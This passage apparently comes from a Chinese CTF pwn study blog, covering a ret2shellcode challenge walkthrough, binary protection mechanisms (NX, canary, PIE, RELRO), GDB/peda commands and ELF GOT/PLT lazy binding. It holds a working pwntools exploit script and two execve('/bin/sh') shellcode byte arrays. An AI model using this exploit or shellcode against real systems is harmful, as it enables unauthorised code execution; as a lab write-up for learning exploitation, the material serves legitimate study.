），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。</p><p>解决完上述问题，我们就可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了。</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220141.png" alt="图2 payload"></p><p>这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。</p><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>本题同样来自于ctf-wiki\challengespwn\stackoverflow\ret2shellcode</p><p>题目源码</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <string.h>char buf2[100];int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("No system for you this time !!!\n");    gets(buf);    strncpy(buf2, buf, 100);//将 buf传给buf2    printf("bye bye ~");    return 0;}</code></pre><p>编译命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -fno-stack-protector//关闭cannary nx保护</code></pre><p>程序关闭了nx保护这就意味着我们输入栈中的数据变得可以执行</p><p>这也就是说，如果我们输入的是一段汇编指令也会被执行</p><p>在本题中，我们就可以在：</p><pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+                                           |     retaddr     |                                           +-----------------+                                           |     saved ebp   |                                    ebp--->+-----------------+                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                                           |                 |                            buf,ebp-0xc---->+-----------------+</code></pre><p>那么如果我们读取字符串：</p><pre class=" language-lang-txt"><code class="language-lang-txt">0x6c*'a'+'bbbb'+success_addr//success_addr为我们想要跳转的地址</code></pre><blockquote><p>为什么是0x6c而不是ida里说的0x64？</p></blockquote><p>主要是因为IDA里出来的偏移量并不是每次都是准确的，需要我们用GDB手动来调试（网上是这样说的，我查了一下午，，，）</p><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p><pre class=" language-lang-txt"><code class="language-lang-txt">                                           +-----------------+                                           |  success_addr   |                                           +-----------------+                                           |       bbbb      |                                    ebp--->+-----------------+                                           |                 |                                           |                 |                                           | 'a'*0x6c        |                                           |                 |                                           |                 |                                           |                 |                              s,ebp-0x64-->+-----------------+</code></pre><p>由于存在strncpy（buf2,buf,100）,因此我们可以把shellcode通过buf写入到buf2中，然后我们知道buf2的地址，即：buf2的地址就是shellcode的起始地址，我们在将返回地址修改为buf2的地址，程序没有开启NX,程序数据中的shellcode可以执行，返回shell</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">from pwn import *sh=process('./ret2shellcode')#这里使用的是pwntools自带的shellcode生成的，也可以使用网上的#asm(shellcraft.sh()) //将shellcode汇编为汇编代码shellcode=asm(shellcraft.sh())buf2_addr=0x0804A080payload=shellcode.ljust(0x6c+0x4,'a')+p32(buf2_addr)sh.sendafter(""No system for you this time !!!\n"",payload)sh.interactive()</code></pre><h2 id="0x40-shellcode-example-of-32-and-64"><a href="#0x40-shellcode-example-of-32-and-64" class="headerlink" title="0x40 shellcode example of 32 and 64"></a>0x40 shellcode example of 32 and 64</h2><p>shellcode32:</p><pre class=" language-lang-shell"><code class="language-lang-shell">/* -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes ------------------------- *  AUTHOR : Tosh *   OS    : BSDx86 (Tested on FreeBSD 8.1) *   EMAIL : tosh@tuxfamily.org */#include <string.h>#include <stdio.h>char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"                   "\x54\x53\xb0\x3b\x50\xcd\x80";int main(void){   void(*f)() = (void*)shellcode;   printf("Len = %d\n", sizeof(shellcode)-1);   f();}/*! %define SYS_EXECV 59section .textglobal _start_start:   xor eax, eax   push eax   push '//sh'   push '/bin'   mov ebx, esp   push eax   push esp   push ebx   mov al, SYS_EXECV   push eax   int 0x80*/</code></pre><p>shellcode64:</p><pre class=" language-lang-shell"><code class="language-lang-shell">/**  * *   _   _            _            ____       _ _  *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | | *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | | *  |  _  | (_| | (__|   <| | | | |  _ < (_) | | | *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_| *           [ http://www.hacknroll.com ] * * Description: *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes * * * * Authors: *    Maycon M. Vitali ( 0ut0fBound ) *        Milw0rm .: http://www.milw0rm.com/author/869 *        Page ....: http://maycon.hacknroll.com *        Email ...: maycon@hacknroll.com * *    Anderson Eduardo ( c0d3_z3r0 ) *        Milw0rm .: http://www.milw0rm.com/author/1570 *        Page ....: http://anderson.hacknroll.com *        Email ...: anderson@hacknroll.com *  * ------------------------------------------------------- *    * amd64# gcc hacknroll.c -o hacknroll * amd64# ./hacknroll * # exit * amd64# * * ------------------------------------------------------- */const char shellcode[] =        "\x48\x31\xc0"                               // xor    %rax,%rax        "\x99"                                       // cltd        "\xb0\x3b"                                   // mov    $0x3b,%al        "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi        "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi        "\x57"                                       // push   %rdi        "\x48\x89\xe7"                               // mov    %rsp,%rdi        "\x57"                                       // push   %rdi        "\x52"                                       // push   %rdx        "\x48\x89\xe6"                               // mov    %rsp,%rsi        "\x0f\x05";                                  // syscallint main(void){        (*(void (*)()) shellcode)();        return 0;}</code></pre><p>shellcodeDB: <a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a></p><h2 id="0x50-shellcode64位汇编指令解析"><a href="#0x50-shellcode64位汇编指令解析" class="headerlink" title="0x50 shellcode64位汇编指令解析"></a>0x50 shellcode64位汇编指令解析</h2><p>前置知识</p><p>64位函数参数传递方式：<a href="http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/" target="_blank" rel="noopener">http://abcdxyzk.github.io/blog/2012/11/23/assembly-args/</a></p><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p><pre class=" language-lang-txt"><code class="language-lang-txt">_start:    xor rax,rax        ;clear rax    add rax,0x3b    ;syscall_64.tbl    xor rdi,rdi        ;clear rdi    push rdi    mov rdi,0x68732f26e69622f    ;hs//nib/==>bin/sh写入rdi    push rdi        ;push stark(rsp-=8) 现在rsp==>bin/sh    lea rdi,[rsp]    ;rdi=rsp(%rdi,%rsi,%rdx,%rcx,%r8,%r9用作函数参数，依次对应第一、第二参数)取bin/sh的地址放到rdi里    xor rsi,rsi        ;clear rsi    xor rdx,rdx        ;clear rdx    syscall</code></pre><p>编译命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">nasm -f elf64 shasm.asm -o shasm.o 编译汇编程序，elf64指定文件类型ld -s -o shasm shasm.o  链接目标文件objcopy -O binary shasm.o.code 提取其中的shellcode部分xxd code 显示方便</code></pre><h2 id="0x60-pwntoos-shellcraft-sh"><a href="#0x60-pwntoos-shellcraft-sh" class="headerlink" title="0x60 pwntoos shellcraft.sh()"></a>0x60 pwntoos shellcraft.sh()</h2><pre class=" language-lang-txt"><code class="language-lang-txt">/* execve(path='/bin///sh', argv=['sh'], envp=0) */    /* push '/bin///sh\x00' */ ==>0x68732f26e69622f    push 0x68    push 0x732f2f2f    push 0x6e69622f            mov ebx, esp    /* push argument array ['sh\x00'] */    /* push 'sh\x00\x00' */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* 'sh\x00' */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80</code></pre><p>int 0x80在linux中用来处理system_call,int表示中断，数字0x80是中断号。 中断将程序stream传送给正在处理该中断的人，在这种情况下，中断为0x80。 在Linux中，0x80中断处理程序是内核，用于由其他程序对内核进行系统调用.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----保护机制(checksec)</title>
      <link href="/2020/02/18/ctf/pwn/pwn-basic/"/>
      <url>/2020/02/18/ctf/pwn/pwn-basic/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN学习记录"><a href="#PWN学习记录" class="headerlink" title="PWN学习记录"></a>PWN学习记录</h1><h2 id="CTF中pwn的保护机制（常见的）"><a href="#CTF中pwn的保护机制（常见的）" class="headerlink" title="CTF中pwn的保护机制（常见的）"></a>CTF中pwn的保护机制（常见的）</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200203234407.png" alt=""></p><p>GCC编译时保护的开关：</p><ol><li>NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息</li><li>PIE：-no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限</li></ol><h3 id="ARCH"><a href="#ARCH" class="headerlink" title="ARCH"></a>ARCH</h3><p>Arch:     amd64-64-little  —    文件类型</p><h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO:    Full RELRO   — 重定向 RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无    法修改got表</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><h3 id="CANNARY-栈保护）"><a href="#CANNARY-栈保护）" class="headerlink" title="CANNARY(栈保护）"></a>CANNARY(栈保护）</h3><p>Stack:    No canary found   — 栈检查，如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过</p><p>这个选项表示栈保护功能有没有开启。</p><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -fno-stack-protector -o test test.c  //禁用栈保护gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</code></pre><h3 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h3><p>NX:       NX enabled    — 不可执行， 如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过</p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -o test test.c</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE:      PIE enabled   — 地址随机化，如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址</p><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><pre class=" language-lang-txt"><code class="language-lang-txt">0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>liunx下关闭PIE的命令如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">sudo -s echo 0 > /proc/sys/kernel/randomize_va_space</code></pre><h2 id="GDB-peda的基本调试命令"><a href="#GDB-peda的基本调试命令" class="headerlink" title="GDB-peda的基本调试命令"></a>GDB-peda的基本调试命令</h2><pre class=" language-lang-txt"><code class="language-lang-txt">peda的一个实用命令checksec检测安全保护。peda的另一个实用命令searchmem用搜索内存file 路径　　附加文件r   　　　　开始执行c              继续执行step          单步步入next          单步步过b *地址　　下断点enable       激活断点disable      禁用断点info b        查看断点del num     删除断点x/wx $esp 　　以4字节16进制显示栈中内容stack 100　　  插件提供的，显示栈中100项 find xxx　　   快速查找，很实用s 按字符串输出x 按十六进制格式显示变量。d 按十进制格式显示变量。u 按十六进制格式显示无符号整型。o 按八进制格式显示变量。t 按二进制格式显示变量。a 按十六进制格式显示变量。c 按字符格式显示变量。f 按浮点数格式显示变量。x/<n/f/u> <addr>n、f、u是可选的参数。b表示单字节，h表示双字节，w表示四字 节，g表示八字节但是实际的组合就那么几种：x/s 地址　　查看字符串x/wx 地址　　查看DWORDx/c 地址　　单字节查看x/16x $esp+12 查看寄存器偏移set args 可指定运行时参数。（如：set args 10 20 30 40 50）show args 命令可以查看设置好的运行参数。peda的教程增强gdb的显示：在调试过程中着色并显示反汇编代码，寄存器和内存信息。添加命令以支持调试和利用开发（有关命令使用的完整列表peda help）：aslr - 显示/设置GDB的ASLR设置checksec - 检查二进制文件的各种安全选项dumpargs - 在呼叫指令处停止时显示传递给函数的参数dumprop - 将特定内存范围内的所有ROP小工具转储elfheader - 从被调试的ELF文件中获取标题信息elfsymbol - 从ELF文件获取非调试符号信息lookup - 搜索所有地址/参考地址属于一个内存范围patch - 修补程序内存以string / hexstring / int的地址开始pattern - 生成，搜索或写入循环模式到内存procinfo - 显示/ proc / pid /pshow - 显示各种PEDA选项和其他设置pset - 设置各种PEDA选项和其他设置readelf - 从ELF文件获取标题信息ropgadget - 获取二进制或库的通用ROP小工具ropsearch - 在内存中搜索ROP小工具searchmem|find - 在内存中搜索模式; 支持正则表达式搜索//查找用，例如searchmem“/ bin / sh”libcshellcode - 生成或下载常用的shellcode。skeleton - 生成python漏洞利用代码模板vmmap -- Get virtual mapping address ranges of section(s) in debugged process  //可以用来查看栈、bss段是否可以执行xormem - 用一个键异或存储区域</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">info file  // 查看当前文件的信息，例如程序入口点info break // 查看当前断点信息disassemble + func // 对指定的函数进行反汇编break +''地址''  // 设置断点r(run)  // 运行程序c(contunue)  // 继续执行x / (n , f ,u) // n,f,u是其三个可选参数  n是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义。  f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i。  u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。layout // 用于分割窗口，可以一边查看代码，一边测试。主要有下面几种用法：layout src // 显示源代码窗口layout asm // 显示汇编窗口layout regs // 显示源代码/汇编和寄存器窗口layout split // 显示源代码和汇编窗口layout next // 显示下一个layoutlayout prev // 显示上一个layoutCtrl + L // 刷新窗口Ctrl + x  再按1 // 单窗口模式，显示一个窗口Ctrl + x  再按2 // 双窗口模式，显示两个窗口Ctrl + x  再按a // 回到传统模式，即退出layout，回到执行layout之前的调试窗口。</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----ELF文件基础</title>
      <link href="/2020/02/18/ctf/pwn/linux-elf/"/>
      <url>/2020/02/18/ctf/pwn/linux-elf/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ELF文件基本常识了解"><a href="#Linux-ELF文件基本常识了解" class="headerlink" title="Linux-ELF文件基本常识了解"></a>Linux-ELF文件基本常识了解</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本篇参考 <a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">StackOverFlow之Ret2libc详解</a> 并使用了其部分内容，在此表示感谢</p><h2 id="0x10-目标文件格式"><a href="#0x10-目标文件格式" class="headerlink" title="0x10 目标文件格式"></a>0x10 目标文件格式</h2><pre class=" language-lang-txt"><code class="language-lang-txt">ELF（Executable Linkable Format ---- 即可执行链接格式），Windows下为PE（Portable Executable ----可移植可执行文件）。它们都是COFF（Common Format ---- 通用文件格式）格式的变种Linux下我们将目标文件与可执行文件统称为ELF文件， 动态链接库（DLL, Dynamic Linking Library 例如：linux下的.so文件）与静态链接库（Static Linking Library 例如：linux下的.a文件）文件都按照</code></pre><div class="table-container"><table><thead><tr><th style="text-align:left">ELF文件类型</th><th style="text-align:left">说明</th><th style="text-align:center">实例</th></tr></thead><tbody><tr><td style="text-align:left">可重定位文件（Relocatable File）</td><td style="text-align:left">这类文件包含了代码和数据，可以用来链接成可执行文件或共享目标文件，静态链接库也可以归为这一类</td><td style="text-align:center">linux 的.o文件</td></tr><tr><td style="text-align:left">可执行文件（Executable File）</td><td style="text-align:left">这类文件包含了可以直接执行的程序，它的代表就是ELF可执行文件，他们一般都没有扩展名</td><td style="text-align:center">比如/bin/bash 文件</td></tr><tr><td style="text-align:left">共享目标文件（Share Object File）</td><td style="text-align:left">这种文件包含了代码和数据，可以在以下两种情况下使用。一种是链接器可以使用这种文件跟其它的可从定位文件和共享目标文件链接，产生显得目标文件。第二种是动态链接器可以将几个这种共享目标文件与可执行文件结合，作为进程映像的一部分来运行</td><td style="text-align:center">linux 的.so，如：/lib/glibc-2.5.so</td></tr><tr><td style="text-align:left">核心转储文件（Core Dump File）</td><td style="text-align:left">当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其它信息转储到核心转储文件</td><td style="text-align:center">linux 下的 core dump</td></tr></tbody></table></div><p>linux 下file命令可以查看文件的属性：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ file ret2libc3ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped</code></pre><p>ELF 32-bit LSB executable //32位可执行文件</p><p>Intel 80386 //Intel版本号</p><p>dynamically linked //动态链接文件</p><h2 id="0x20-GOT（Global-offset-Table）"><a href="#0x20-GOT（Global-offset-Table）" class="headerlink" title="0x20 GOT（Global offset Table）"></a>0x20 GOT（Global offset Table）</h2><p>全局偏移表. 这是链接器在执行链接时<br>实际上要填充的部分, 保存了所有外部符号的地址信息.<br>不过值得注意的是, 在i386架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了<br>3个公共表项, 每项32位(4字节), 保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址</li><li>got[1]: 本ELF的<code>link_map</code>数据结构描述符地址</li><li>got[2]: <code>_dl_runtime_resolve</code>函数的地址</li></ul><p>其中, <code>link_map</code>数据结构的定义如下:</p><pre class=" language-lang-C"><code class="language-lang-C">struct link_map{   /* Shared library's load address. */   ElfW(Addr) l_addr;                    /* Pointer to library's name in the string table. */                                    char *l_name;       /*         Dynamic section of the shared object.        Includes dynamic linking info etc.        Not interesting to us.     */                      ElfW(Dyn) *l_ld;      /* Pointer to previous and next link_map node. */                    struct link_map *l_next, *l_prev;   };</code></pre><h2 id="0x30-DLL-Dynamic-linking"><a href="#0x30-DLL-Dynamic-linking" class="headerlink" title="0x30 DLL (Dynamic linking)"></a>0x30 DLL (Dynamic linking)</h2><p><strong>动态链接</strong> 是指在程序装载时通过 <strong>动态链接器</strong> 将程序所需的所有 <strong>动态链接库(Dynamic linking library)</strong> 装载至进程空间中（ 程序按照模块拆分成各个相对独立的部分），当程序运行时才将他们链接在一起形成一个完整程序的过程。它诞生的最主要的的原因就是 <strong>静态链接</strong> 太过于浪费内存和磁盘的空间，并且现在的软件开发都是模块化开发，不同的模块都是由不同的厂家开发，在 <strong>静态链接</strong> 的情况下，一旦其中某一模块发生改变就会导致整个软件都需要重新编译，而通过 <strong>动态链接</strong> 的方式就推迟这个链接过程到了程序运行时进行。这样做有以下几点好处：</p><p>1、节省内存、磁盘空间</p><p>例如磁盘中有两个程序，p1、p2，且他们两个都包含 lib.o 这个模块，在 <strong>静态链接</strong> 的情况下他们在链接输出可执行文件时都会包含 lib.o 这个模块，这就造成了磁盘空间的浪费。当这两个程序运行时，内存中同样也就包含了这两个相同的模块，这也就使得内存空间被浪费。当系统中包含大量类似 lib.o 这种被多个程序共享的模块时，也就会造成很大空间的浪费。在 <strong>动态链接</strong> 的情况下，运行 p1 ，当系统发现需要用到 lib.o ，就会接着加载 lib.o 。这时我们运行 p2 ，就不需要重新加载 lib.o 了，因为此时 lib.o 已经在内存中了，系统仅需将两者链接起来，此时内存中就只有一个 lib.o 节省了内存空间。</p><p>2、程序更新更简单</p><p>比如程序 p1 所使用的 lib.o 是由第三方提供的，等到第三方更新、或者为 lib.o 打补丁的时候，p1 就需要拿到第三方最新更新的 lib.o ，重新链接后在将其发布给用户。程序依赖的模块越多，就越发显得不方便，毕竟都是从网络上获取新资源。在 <strong>动态链接</strong> 的情况下，第三方更新 lib.o 后，理论上只需要覆盖掉原有的 lib.o ，就不必重新链接整个程序，在程序下一次运行时，新版本的目标文件就会自动装载到内存并且链接起来，就完成了升级的目标。</p><p>3、增强程序扩展性和兼容性</p><p><strong>动态链接</strong> 的程序在运行时可以动态地选择加载各种模块，也就是我们常常使用的插件。软件的开发商开发某个产品时会按照一定的规则制定好程序的接口，其他开发者就可以通过这种接口来编写符合要求的动态链接文件，以此来实现程序功能的扩展。增强兼容性是表现在 <strong>动态链接</strong> 的程序对不同平台的依赖差异性降低，比如对某个函数的实现机制不同，如果是 <strong>静态链接</strong> 的程序会为不同平台发布不同的版本，而在 <strong>动态链接</strong> 的情况下，只要不同的平台都能提供一个动态链接库包含该函数且接口相同，就只需用一个版本了。</p><p>总而言之，<strong>动态链接</strong> 的程序在运行时会根据自己所依赖的 <strong>动态链接库</strong> ，通过 <strong>动态链接器</strong> 将他们加载至内存中，并在此时将他们链接成一个完整的程序。Linux 系统中，<strong>ELF</strong> 动态链接文件被称为 <strong>动态共享对象（Dynamic Shared Objects）</strong> ， 简称 <strong>共享对象</strong> 一般都是以 “.so” 为扩展名的文件；在 windows 系统中就是常常软件报错缺少 xxx.dll 文件。</p><h2 id="0x40-延迟绑定-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table"><a href="#0x40-延迟绑定-Lazy-Binding-amp-amp-PLT-Procedure-Linkage-Table" class="headerlink" title="0x40 延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>0x40 延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h2><p>因为 <strong>动态链接</strong> 的程序是在运行时需要对全局和静态数据访问进行GOT定位，然后间接寻址。同样，对于模块间的调用也需要GOT定位，再才间接跳转，这么做势必会影响到程序的运行速度。而且程序在运行时很大一部分函数都可能用不到，于是ELF采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的 <strong>延迟绑定</strong>。ELF实现 <strong>延迟绑定</strong> 是通过 <strong>PLT</strong> ，原先 <strong>GOT</strong> 中存放着全局变量和函数调用，现在把他拆成另个部分 .got 和 .got.plt，用 .got 存放着全局变量引用，用 .got.plt 存放着函数引用。查看 test@plt 代码，用 objdump -Mintel -d -j .plt got</p><blockquote><p>-Mintel 选项指定 intel 汇编语法<br>-d 选项展示可执行文件节的汇编形式<br>-j 选项后面跟上节名，指定节</p></blockquote><pre class=" language-lang-txt"><code class="language-lang-txt">00001060 <test@plt>:    1060:    ff a3 14 00 00 00        jmp    DWORD PTR [ebx+0x14]    1066:    68 10 00 00 00           push   0x10    106b:    e9 c0 ff ff ff           jmp    1030 <.plt></code></pre><p>查看 main()函数 中调用 test@plt 的反汇编代码</p><pre class=" language-lang-txt"><code class="language-lang-txt">    11ee:    e8 cd fe ff ff           call   10c0 <__x86.get_pc_thunk.bx>    11f3:    81 c3 0d 2e 00 00        add    ebx,0x2e0d    11f9:    e8 bb ff ff ff           call   11b9 <fun>    11fe:    e8 5d fe ff ff           call   1060 <test@plt></code></pre><p><strong>x86.gett_pc_thunk.bx 函数与之前的 </strong>x86.get_pc_thunk.ax 功能一样 ，得出 ebx = 0x11f3 + 0x2e0d = 0×4000 ，ebx + 0×14 = 0×4014 。首先 jmp 指令，跳转到 0×4014 这个地址，这个地址在 .got.plt 节中 ：</p><p><a href="https://image.3001.net/images/20180912/1536732068_5b98aba48c7ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536732068_5b98aba48c7ed.png!small" alt=".got.plt."></a></p><p>也就是当程序需要调用到其他模块中的函数时例如 fun() ，就去访问保存在 .got.plt 中的 fun@plt 。这里有两种情况，第一种就是第一次使用这个函数，这个地方就存放着第二条指令的地址，也就相当于什么都不做。用 objdump -d -s got -j .got.plt 命令查看节中的内容</p><blockquote><p>-s 参数显示指定节的所有内容</p></blockquote><p><a href="https://image.3001.net/images/20180912/1536733936_5b98b2f08b3d6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536733936_5b98b2f08b3d6.png!small" alt="got.plt"></a></p><p>4014 处存放着 66 10 00 00 ，因为是小端序所以应为 0×00001066，这个位置刚好对应着 push 0×10 这条指令，这个值是 test 这个符号在 .rel.plt 节中的下标。继续 jmp 指令跳到 .plt 处</p><p><a href="https://image.3001.net/images/20180912/1536737269_5b98bff50df77.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536737269_5b98bff50df77.png!small" alt=".plt"></a></p><p>push DWORD PTR [ebx + 0x4] 指令是将当前模块ID压栈，也就是 got.c 模块，接着 jmp DWORD PTR [ebx + 0x8] ，这个指令就是跳转到 <strong>动态链接器</strong> 中的 _dl_runtime_resolve 函数中去。这个函数的作用就是在另外的模块中查找需要的函数，就是这里的在 got_extern.so 模块中的 test 函数。然后_dl_runtime_resolve函数会将 test() 函数的真正地址填入到 test@got 中去也就是 .got.plt 节中。那么第二种情况就是，当第二次调用test()@plt 函数时，就会通过第一条指令跳转到真正的函数地址。整个过程就是所说的通过 <strong>plt</strong> 来实现 <strong>延迟绑定</strong> 。程序调用外部函数的整个过程就是，第一次访问 test@plt 函数时，<strong>动态链接器</strong>就会去动态共享模块中查找 test 函数的真实地址然后将真实地址保存到test@got中(.got.plt)；第二次访问test@plt时，就直接跳转到test@got中去。</p><h2 id="0x100-参考资料"><a href="#0x100-参考资料" class="headerlink" title="0x100 参考资料"></a>0x100 参考资料</h2><ol><li><p>《程序员的自我修养 —— 链接，装载与库》第三章 3.1 目标文件的格式</p></li><li><p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">StackOverFlow之Ret2libc详解</a> </p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn基础----栈基础</title>
      <link href="/2020/02/09/ctf/pwn/pwn-zhan/"/>
      <url>/2020/02/09/ctf/pwn/pwn-zhan/</url>
      
